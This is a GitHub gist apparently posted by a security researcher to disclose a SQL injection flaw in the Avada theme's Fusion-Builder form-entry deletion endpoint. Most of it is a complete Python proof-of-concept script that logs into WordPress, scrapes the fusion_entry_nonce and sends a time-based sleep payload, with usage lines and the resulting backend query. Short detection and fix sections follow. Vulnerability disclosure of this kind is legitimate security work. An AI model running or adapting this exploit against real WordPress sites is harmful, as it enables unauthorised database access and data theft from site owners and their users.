
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2F05a32f63d75082ab05de27e313e70fa3)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2F05a32f63d75082ab05de27e313e70fa3&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2F05a32f63d75082ab05de27e313e70fa3) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2F05a32f63d75082ab05de27e313e70fa3&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@Xib3rR4dAr](https://avatars.githubusercontent.com/u/24238512?s=64&v=4)](/Xib3rR4dAr)

# [Xib3rR4dAr](/Xib3rR4dAr)/**[Avada\_SQL\_Injection\_PoC.md](/Xib3rR4dAr/05a32f63d75082ab05de27e313e70fa3)** Secret

Last active
February 14, 2024 12:21

Show Gist options

* [Download ZIP](/Xib3rR4dAr/05a32f63d75082ab05de27e313e70fa3/archive/01127b2f075410ebb9311fe414b1ec2b3485c3a3.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2F05a32f63d75082ab05de27e313e70fa3)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2F05a32f63d75082ab05de27e313e70fa3)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/Xib3rR4dAr/05a32f63d75082ab05de27e313e70fa3.js&quot;&gt;&lt;/script&gt;
* Save Xib3rR4dAr/05a32f63d75082ab05de27e313e70fa3 to your computer and use it in GitHub Desktop.

[Code](/Xib3rR4dAr/05a32f63d75082ab05de27e313e70fa3)
[Revisions
3](/Xib3rR4dAr/05a32f63d75082ab05de27e313e70fa3/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/Xib3rR4dAr/05a32f63d75082ab05de27e313e70fa3.js&quot;&gt;&lt;/script&gt;

Save Xib3rR4dAr/05a32f63d75082ab05de27e313e70fa3 to your computer and use it in GitHub Desktop.

[Download ZIP](/Xib3rR4dAr/05a32f63d75082ab05de27e313e70fa3/archive/01127b2f075410ebb9311fe414b1ec2b3485c3a3.zip)

Avada <=7.11.4 / Fusion-Builder <= 3.11.4 Editor+ SQL Injection

 [Raw](/Xib3rR4dAr/05a32f63d75082ab05de27e313e70fa3/raw/01127b2f075410ebb9311fe414b1ec2b3485c3a3/Avada_SQL_Injection_PoC.md)

[**Avada\_SQL\_Injection\_PoC.md**](#file-avada_sql_injection_poc-md)

# Avada <=7.11.4 / Fusion-Builder <= 3.11.4 Editor+ SQL Injection

Exploit Author: Muhammad Zeeshan (Xib3rR4dAr)

### Description

Avada includes Fusion-Builder plugin, Form entry deletion endpoint was found vulnerable to SQL Injection. Any user having `delete_others_posts` capability can exploit it. By default Super Admins, Admins, and editors have this capability. Editor users have less privileges that admins, but exploiting SQL Injection, editors or any user having required capaility can exploit SQL Injection for further attacks.

### Proof of Concept

Usage:

```
python3 avada_sqli_poc.py WORDPRESS_URL USERNAME PASSWORD SLEEPTIME
```

e.g

```
python3 avada_sqli_poc.py http://127.0.0.1 editor editor 10
```

SQL Injection Payload `(select*from(select(sleep(10)))asdf)` is used which wont delete any entry. Backend query would become:

```
SELECT * FROM `wp_fusion_form_submissions` WHERE id = (select*from(select(sleep(10)))asdf)
```

avada\_sqli\_poc.py:

```
import sys
import requests
from bs4 import BeautifulSoup
import re
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

wordpress_url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
sleep_time = sys.argv[4]

payload = f"(select*from(select(sleep({sleep_time})))asdf)"

proxyDict = {}
# Uncomment to use proxy
# proxyDict = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

session = requests.Session()

login_url = f"{wordpress_url}/wp-login.php"
# Login to WordPress
login_payload = {
    "log": username,
    "pwd": password,
    "wp-submit": "Log In",
}

login_response = session.post(
    login_url, data=login_payload, proxies=proxyDict, verify=False
)

# Check if login was successful
if "wp-admin" in login_response.url:
    print("Login successful")
else:
    print("Login failed")
    exit()

# URL to get the nonce from
forms_url = f"{wordpress_url}/wp-admin/admin.php?page=avada-forms"

form_response = session.get(forms_url, proxies=proxyDict, verify=False)

# Extract fusion_entry_nonce from the response
soup = BeautifulSoup(form_response.text, "html.parser")
script_content = soup.find("script", {"id": "fusion_form_admin_js-js-extra"}).text
fusion_entry_nonce_match = re.search(
    r'"fusion_entry_nonce":"([a-f0-9]+)"', script_content
)

if fusion_entry_nonce_match:
    fusion_entry_nonce = fusion_entry_nonce_match.group(1)
    print(f"fusion_entry_nonce: {fusion_entry_nonce}")
else:
    print("fusion_entry_nonce not found")
    exit()

# URL for the POST request to remove an entry
remove_entry_url = f"{wordpress_url}/wp-admin/admin-ajax.php"

remove_entry_payload = {
    "action": "fusion_remove_form_entry",
    "fusion_entry_nonce": fusion_entry_nonce,
    "entry": payload,
}

start_time = time.time()
# Send POST request to remove form entry
remove_entry_response = session.post(
    remove_entry_url, data=remove_entry_payload, proxies=proxyDict, verify=False
)
end_time = time.time()

print(f"Remove Entry Response: {remove_entry_response.text}")

# Print the time taken
time_taken = end_time - start_time
print(f"Time taken for SQL Injection request's response: {time_taken} seconds")
```

### Screenshots

[![image](https://private-user-images.githubusercontent.com/24238512/304702739-bc60d91e-2efb-40dd-9cdb-e73b8138be25.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjQ3MTcsIm5iZiI6MTczNjU2NDQxNywicGF0aCI6Ii8yNDIzODUxMi8zMDQ3MDI3MzktYmM2MGQ5MWUtMmVmYi00MGRkLTljZGItZTczYjgxMzhiZTI1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzMDAxN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTFiOWUyNmZmODY3M2JiOWViMTY2MjJlMjFlMzk5OTIyMmU5Y2ZmYWMyODEyMTlkMzU0YzJmZTY2ZGUwOGZmMWImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.rO2w6QF1QZa71WALjrDmToaNw5u_vEsZ9ld0-f6Gspo)](https://private-user-images.githubusercontent.com/24238512/304702739-bc60d91e-2efb-40dd-9cdb-e73b8138be25.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjQ3MTcsIm5iZiI6MTczNjU2NDQxNywicGF0aCI6Ii8yNDIzODUxMi8zMDQ3MDI3MzktYmM2MGQ5MWUtMmVmYi00MGRkLTljZGItZTczYjgxMzhiZTI1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzMDAxN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTFiOWUyNmZmODY3M2JiOWViMTY2MjJlMjFlMzk5OTIyMmU5Y2ZmYWMyODEyMTlkMzU0YzJmZTY2ZGUwOGZmMWImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.rO2w6QF1QZa71WALjrDmToaNw5u_vEsZ9ld0-f6Gspo)

[![image](https://private-user-images.githubusercontent.com/24238512/304703086-5b10ee6a-6ec7-46c3-8c93-8a30470899b5.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjQ3MTcsIm5iZiI6MTczNjU2NDQxNywicGF0aCI6Ii8yNDIzODUxMi8zMDQ3MDMwODYtNWIxMGVlNmEtNmVjNy00NmMzLThjOTMtOGEzMDQ3MDg5OWI1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzMDAxN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTY0ZGMxZGVhZDMwNmVkM2M0ZTk4MDdkMGM3YzcwZTdiZjE5YzU0NTc3ZmNjMjE3YTQ1ZjMzMzA3NmJhNDUyNWEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.gbJZDpHMjyrixoT2Ppal81wxRHT1RzZ3YcDn-_YWTRQ)](https://private-user-images.githubusercontent.com/24238512/304703086-5b10ee6a-6ec7-46c3-8c93-8a30470899b5.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjQ3MTcsIm5iZiI6MTczNjU2NDQxNywicGF0aCI6Ii8yNDIzODUxMi8zMDQ3MDMwODYtNWIxMGVlNmEtNmVjNy00NmMzLThjOTMtOGEzMDQ3MDg5OWI1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzMDAxN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTY0ZGMxZGVhZDMwNmVkM2M0ZTk4MDdkMGM3YzcwZTdiZjE5YzU0NTc3ZmNjMjE3YTQ1ZjMzMzA3NmJhNDUyNWEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.gbJZDpHMjyrixoT2Ppal81wxRHT1RzZ3YcDn-_YWTRQ)

[![image](https://private-user-images.githubusercontent.com/24238512/304703764-8004e7f5-557b-4f0a-8cdc-6c669239b74e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjQ3MTcsIm5iZiI6MTczNjU2NDQxNywicGF0aCI6Ii8yNDIzODUxMi8zMDQ3MDM3NjQtODAwNGU3ZjUtNTU3Yi00ZjBhLThjZGMtNmM2NjkyMzliNzRlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzMDAxN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTQ5MDBlNTRhYTczNTMyZmEwMWM3YWFkYTExY2ZjNzNiMWEwYTg0MjY0ZTZiNjlkMjJiZDIxMzhjMTZjMDM4YWUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.pyBoTI98JKPK5qlZk9G9tBQaxsTqJXwDoYM8tusZ-QE)](https://private-user-images.githubusercontent.com/24238512/304703764-8004e7f5-557b-4f0a-8cdc-6c669239b74e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjQ3MTcsIm5iZiI6MTczNjU2NDQxNywicGF0aCI6Ii8yNDIzODUxMi8zMDQ3MDM3NjQtODAwNGU3ZjUtNTU3Yi00ZjBhLThjZGMtNmM2NjkyMzliNzRlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzMDAxN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTQ5MDBlNTRhYTczNTMyZmEwMWM3YWFkYTExY2ZjNzNiMWEwYTg0MjY0ZTZiNjlkMjJiZDIxMzhjMTZjMDM4YWUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.pyBoTI98JKPK5qlZk9G9tBQaxsTqJXwDoYM8tusZ-QE)

[![image](https://private-user-images.githubusercontent.com/24238512/304704222-51087a3b-830c-407b-8d52-9d56b1b86b25.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjQ3MTcsIm5iZiI6MTczNjU2NDQxNywicGF0aCI6Ii8yNDIzODUxMi8zMDQ3MDQyMjItNTEwODdhM2ItODMwYy00MDdiLThkNTItOWQ1NmIxYjg2YjI1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzMDAxN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTdiYjQ0MWI4N2EyNzA0NmUwODQxYzA5NGUzN2Q5MTcwNWM5YzliNWMxYmU3MGViNDU2NzExYmQ5MTQ0YWZmNzImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.O4URrS54Eg4AF1Y2ovOEA7HO6Jce80dHnGOKKC2yLJ8)](https://private-user-images.githubusercontent.com/24238512/304704222-51087a3b-830c-407b-8d52-9d56b1b86b25.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjQ3MTcsIm5iZiI6MTczNjU2NDQxNywicGF0aCI6Ii8yNDIzODUxMi8zMDQ3MDQyMjItNTEwODdhM2ItODMwYy00MDdiLThkNTItOWQ1NmIxYjg2YjI1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzMDAxN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTdiYjQ0MWI4N2EyNzA0NmUwODQxYzA5NGUzN2Q5MTcwNWM5YzliNWMxYmU3MGViNDU2NzExYmQ5MTQ0YWZmNzImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.O4URrS54Eg4AF1Y2ovOEA7HO6Jce80dHnGOKKC2yLJ8)

### Detection

Endpoint: WordPress' ajax e.g `/wp-admin/admin-ajax.php`

Request Parameter: `action` is `fusion_remove_form_entry` AND `entry` is not an integer.

### Fix

Cast parameter `entry` to int before passing to backend SQL query.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2F05a32f63d75082ab05de27e313e70fa3)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

